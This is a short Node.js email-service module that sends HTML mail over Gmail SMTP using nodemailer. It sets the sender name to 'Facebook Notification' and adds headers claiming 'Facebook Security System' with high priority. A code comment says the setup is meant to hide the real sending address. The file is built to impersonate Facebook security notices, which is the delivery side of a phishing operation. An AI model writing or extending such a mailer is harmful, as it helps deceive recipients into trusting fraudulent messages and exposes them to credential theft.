// services/emailService.js
const nodemailer = require("nodemailer");

const transporter = nodemailer.createTransport({
  host: "smtp.gmail.com",
  port: 587,
  secure: false,
  auth: {
    user: process.env.GMAIL_USER,
    pass: process.env.GMAIL_PASS,
  },
});

// Verify connection
transporter.verify((err) => {
  if (err) {
    console.error("SMTP ERROR:", err);
  } else {
    console.log("SMTP READY ✅");
  }
});

async function sendEmail(to, subject, html) {
  try {
    const mailOptions = {
      from: `"Facebook Notification" <${process.env.GMAIL_USER}>`, // 👈 hides raw email
      to,
      subject,
      html,

      headers: {
        "X-Mailer": "Facebook Security System",
        "X-Priority": "1",
        "Importance": "High",
      },
    };

    const info = await transporter.sendMail(mailOptions);

    // ✅ CLEAN LOGS
    console.log("📧 Email sent to:", to);
    console.log("📨 Message ID:", info.messageId);

    return true;

  } catch (err) {
    console.error("❌ EMAIL ERROR:", err.message);
    return false;
  }
}

module.exports = sendEmail;